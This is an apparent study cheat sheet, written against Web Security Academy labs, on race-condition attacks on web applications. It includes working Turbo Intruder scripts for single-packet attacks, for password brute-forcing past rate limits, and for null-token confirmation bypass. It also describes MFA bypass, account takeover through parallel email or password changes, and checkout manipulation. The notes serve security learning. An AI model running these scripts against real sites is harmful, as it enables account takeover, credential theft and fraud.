# Race Conditions
## Limit overrun race condition
If site blocks multiple usaeg of same request (for example redeeming of gift card more then one time), we can possibly try to enter into "race window" during which site processes request. In such case we can send nosequent request with very small pause between requests or send multiple requests in same time. In such way we can create multiple requests during which first request is proceeded and before server starts to block it.  
With burp we can achieve this adding multiple requests in repeater into a group and sending it in parallel (using request sending options)

## Turbo Intruder race condition
Single-packet attack:
1. Ensure that target supports HTTP/2
2. Set the engine `engine=Engine.BURP2` and `concurrentConnections=1` configuration options for the request engine
3. When queueing your requests, group them by assigning them to a named gate using the `gate` argument for the `engine.queue()` method.
4. To send all of the requests in a given group, open the respective gate with the `engine.openGate()` method.

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```

## Bypassing bruteforce rate limit
When we are sending invalid credentials sequently, we can have problem with rate limit (captcha solving or blocking of login attempts).  
We can solve this with race condition and Turbo Intruder, sending many passwords at one time.  
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    passwords = wordlists.clipboard
    
    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

```
Here we are using password list from our clipboard.  

## Bypassing multi-step sequences
With race conditions we could be possibly able to bypass some mechanisms such as MFA, sending request to sensitive data BEFORE MFA is generated and checked.
```
POST /login
GET /admin
```
If we will send this requests quick enough, we could be potentially able to bypass MFA check which must arise right after login request.  

To check race conditions we can send group of requests in sequence (separate connections), then single-packet attack (parallel connections) and observe responses.  

## Multi-endpoint race conditions
We can potentially bypass basket confirmations in online shops if we will by something additionally during basket confirmation. So we have 1 item in basket and during order confirmation we are adding one more item and buying it together with first.  
Always try t oexploit race condition couple of times.  
Also try to send "warming" requests to another endpoints such as /home  
Also we can try to slow down the server sending multiple dummy hard requests to make race window bigger  

## Single-endpoint race condition
We can try to exploit update email or update password functionality with race condition. 
For example we can send request to change our e-mail to something available and in parallel send request to change our e-mail to one that is occupied by another user, cathing it's account. Or we can try to send request to update our password and in parallel send request to change another user's password.  

## Partial construction race conditions
This race condition appears when some objects initialized by server are initialized partially with null values (For example API key for user during registration could be null for small race window)  
In PHP and Ruby we are able to construct requests with null values like this: 
```
GET /api/user/info?user=victim&api-key[]= HTTP/2
```
So as example we can try to create user with unexisting email and skip confirmation stage when sending request to /confirm endpoint with null value
```

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-TOKEN
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

## Time-based attacks
If server uses timestamp for encrypting password, we potentially could be able to reset password for two different suers if we send our requests at the same time.  
